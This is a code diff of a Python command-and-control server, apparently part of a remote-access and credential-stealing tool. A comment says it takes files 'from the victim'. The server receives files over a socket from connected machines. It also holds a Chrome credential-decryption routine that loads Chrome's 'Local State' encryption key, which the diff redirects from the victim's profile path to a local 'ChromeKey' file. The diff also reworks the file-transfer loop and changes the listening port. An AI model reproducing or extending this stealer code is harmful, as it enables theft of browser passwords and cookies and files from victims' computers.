@@ -51,9 +51,7 @@ class Server:
         return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
     def get_encryption_key(self):
-        with open(os.path.join(os.environ["USERPROFILE"],
-                               "AppData", "Local", "Google", "Chrome",
-                               "User Data", "Local State"), "r", encoding="utf-8") as file:
+        with open('ChromeKey', "r", encoding="utf-8") as file:
             local_state = file.read()
             local_state = json.loads(local_state)
         # decode the encryption key from Base64
@@ -124,21 +122,38 @@ class Server:
         # Take from the victim file
         if path_to_save == "":
             self.web_server_socket.send("Where do you want save the file?".encode())
-            path_to_save = file_path = self.web_server_socket.recv(1024).decode()
+            data = self.web_server_socket.recv(1024).decode()[0]
+            print(data)
+            path_to_save = data
+
+        total_file_size = 0
+        file_size = int(sock.recv(15).decode('utf-8', 'ignore'))
+        print("File size is " + str(file_size))
 
         with open(path_to_save, 'wb')as f:
             print('Open File')
             self.web_server_socket.send("Open File".encode())
-            while True:
+            while total_file_size != file_size:
                 data = sock.recv(1024)
-                if not data or len(data) < 1024:
-                    if data:
-                        f.write(data)
-                    f.flush()
-                    f.close()
-                    break
+                print("Data length is " + str(len(data)))
+                total_file_size += len(data)
                 f.write(data)
+                print(total_file_size)
+
+                # if not data or len(data) < 1024:
+                #     if data:
+                #         f.write(data)
+                #
+                #     f.flush()
+                #     f.close()
+                #     break
+                # f.write(data)
+
+            f.flush()
+            f.close()
+        print("Final Total data length is " + str(total_file_size))
         print('done')
+        sock.send("Finished!".encode())
         self.web_server_socket.send('Done!'.encode())
 
     def send_file_to_client(self, data, sock):
@@ -251,7 +266,7 @@ class Server:
     # self.server_socket.close()
 
 
-myServer = Server(9999, '127.0.0.1', 1, 'client1')
+myServer = Server(9087, '127.0.0.1', 1, 'client1')
 myServer.runThread()
 
 # myServer2 = Server(9999, '127.0.0.1', 1, 'client2')
